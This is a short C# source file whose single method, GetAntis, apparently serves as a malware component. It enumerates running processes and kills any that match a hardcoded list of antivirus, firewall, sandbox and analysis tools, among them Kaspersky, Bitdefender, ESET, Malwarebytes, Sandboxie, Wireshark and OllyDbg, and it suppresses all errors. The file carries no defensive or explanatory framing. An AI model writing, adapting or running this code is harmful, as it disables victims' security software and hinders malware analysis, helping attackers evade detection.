using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace An
{
    public class Main
    {
        public static void GetAntis(string what, string when)
        {
            if (what != "all")
            {
                return;
            }
            if (when != "now")
            {
                return;
            }
            try
            {
                List<string> L = new List<string>(new string[] { "sample", "outpost", "npfmsg", "bdagent", "kavsvc", "egui", "zlclient", "sbiesvc", "keyscrambler", "wireshark", "mbam", "ollydbg" });
                foreach (System.Diagnostics.Process pr in System.Diagnostics.Process.GetProcesses())
                {
                    if (L.Contains(pr.ProcessName.ToLower()))
                    {
                        pr.Kill();
                    }
                }
            }
            catch { }
        }
    }

}